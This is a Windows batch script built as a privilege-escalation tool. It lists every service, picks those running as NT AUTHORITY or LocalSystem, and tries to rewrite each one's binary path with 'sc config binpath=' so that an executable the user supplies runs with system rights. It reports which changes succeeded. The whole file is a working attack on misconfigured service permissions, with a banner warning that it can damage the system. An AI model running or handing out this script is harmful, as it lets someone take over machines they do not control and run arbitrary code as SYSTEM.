@echo off

echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo ! This file can damage your system          !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

echo. 
echo.


setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION

if "%1" == "" goto noarg
if not exist "%1" goto badarg

set credits[0]="NT AUTHORITY"
set credits[1]="LocalSystem"

sc query > _services.tmp
find "SERVICE_NAME:" _services.tmp > scq.tmp
del _services.tmp
for /f "delims=." %%i in (scq.tmp) do (
    set scname=%%i
    set scname="!scname:~14!"
    if not "!scname!" == "" (
       call sc qc !scname! | find !credits[0]! > privs.tmp
       call sc qc !scname! | find !credits[1]! >> privs.tmp
    )
    set /p prv=<privs.tmp 
    if not "!prv!" == "" (
       echo [+]. try to escalate privileges of [%1] via [!scname!] 
       call sc config !scname!  binpath= %1 > rst.tmp
rem change ! different os have different msg
       more rst.tmp | find "[SC] OpenService FAILED" 
       more rst.tmp | find "[SC] ChangeServiceConfig SUCCESS"
    )
)
if exist privs.tmp del privs.tmp
if exist rst.tmp del rst.tmp


if exist del scq.tmp
goto exit


:noarg 
 echo [+]. ERROR 
 echo [+]. No argument ...  
 echo [+]. Use xyz.bat f:/ile/path/tho/your/apllication.exe ...
 goto exit

:badarg
 echo [+]. ERROR
 echo [+]. Bad argument file does not exist

:exit

endlocal